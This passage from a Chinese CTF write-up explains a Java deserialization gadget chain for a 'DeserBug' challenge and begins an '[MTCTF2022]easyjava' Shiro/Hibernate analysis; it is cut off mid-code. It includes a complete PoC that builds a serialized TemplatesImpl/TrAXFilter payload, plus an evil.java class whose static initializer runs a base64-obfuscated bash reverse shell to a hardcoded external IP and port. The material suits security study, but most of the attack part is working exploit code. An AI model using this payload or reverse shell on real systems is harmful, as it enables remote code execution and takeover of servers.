class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexpect</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">   <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">   <span class="keyword">private</span> Class targetclass;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String anyexcept;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Class <span class="title function_">getTargetclass</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.targetclass;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTargetclass</span><span class="params">(Class targetclass)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.targetclass = targetclass;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Object[] getTypearg() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.typearg;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypearg</span><span class="params">(Object[] typearg)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.typearg = typearg;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">      <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnyexcept</span><span class="params">(String anyexcept)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.anyexcept = anyexcept;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Class[] getTypeparam() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.typeparam;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypeparam</span><span class="params">(Class[] typeparam)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.typeparam = typeparam;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">   <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好对应CC3的这里, 不过<code>InstantiateTransformer.transform()</code>这一步是用不了了, 所以要寻找<code>LazyMap.get()</code>到<code>TrAXFilter.constructor()</code>的链条</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240816214619253.png" alt="image-20240816214619253"></p><p>题目有一条提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</span><br></pre></td></tr></table></figure><p>这一步是隐式调用, 类似于fastjson中的那样</p><p>并且在<code>LazyMap#get</code>中恰好调用了<code>map.put</code></p><p>那么这条链子就成型了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240816215629072.png" alt="image-20240816215629072"></p><p>动手编写poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.app.Myexpect;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">       <span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF_DOC\\练习tmp\\DeserBug\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evilcodes = &#123;codes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(jsonObject, factory);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="number">3</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evilcodes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">Properties</span>());</span><br><span class="line"></span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(myexpect, <span class="string">&quot;targetclass&quot;</span>, TrAXFilter.class);</span><br><span class="line">        setValue(myexpect, <span class="string">&quot;typeparam&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;);</span><br><span class="line">        setValue(myexpect, <span class="string">&quot;typearg&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        setValue(factory, <span class="string">&quot;iConstant&quot;</span>, myexpect);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(hashMap);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serialize);</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        saveFile(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        System.out.println(poc.length());</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(poc);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">saveFile</span><span class="params">(String poc, String fileName)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fileName))) &#123;</span><br><span class="line">           writer.write(poc);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String key,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(key);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>evil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="MTCTF2022-easyjava"><a href="#MTCTF2022-easyjava" class="headerlink" title="[MTCTF2022]easyjava"></a>[MTCTF2022]easyjava</h2><p>先去看pom.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8090</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/web</span></span><br><span class="line"><span class="attr">spring.thymeleaf.cache</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">spring.thymeleaf.mode</span>=<span class="string">HTML5</span></span><br></pre></td></tr></table></figure><p>可以看见网站根目录在&#x2F;web</p><p>再看pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--hibernate--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.8.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有两处是存在漏洞的</p><p>看源码</p><p>HelloConctroller.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.MyController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.butler.springboot14shiro.Util.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">      model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/login&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(String username, String password, Model model)</span> &#123;</span><br><span class="line">      <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line">      <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(username, password);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         subject.login(token);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;admin/hello&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (UnknownAccountException var7) &#123;</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;用户名错误&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IncorrectCredentialsException var8) &#123;</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/admin/hello&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = false)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">         <span class="type">MyObjectInputStream</span> <span class="variable">myObjectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(inputStream);</span><br><span class="line">         myObjectInputStream.readObject();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">         var6.printStackTrace();</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;data=&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;admin/hello&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ShrioConfig.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.Config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(<span class="meta">@Qualifier(&quot;getDefaultWebSecurityManager&quot;)</span> DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">      <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">      bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">      Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line">       <span class="comment">// 这里 &quot;anon&quot;表示匿名可访问, &quot;authc&quot;是需要鉴权</span></span><br><span class="line">      filterMap.put(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">      filterMap.put(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">      filterMap.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">bean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line">      bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> bean;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier(&quot;adminRealm&quot;)</span> AdminRealm adminRealm)</span> &#123;</span><br><span class="line">      <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span 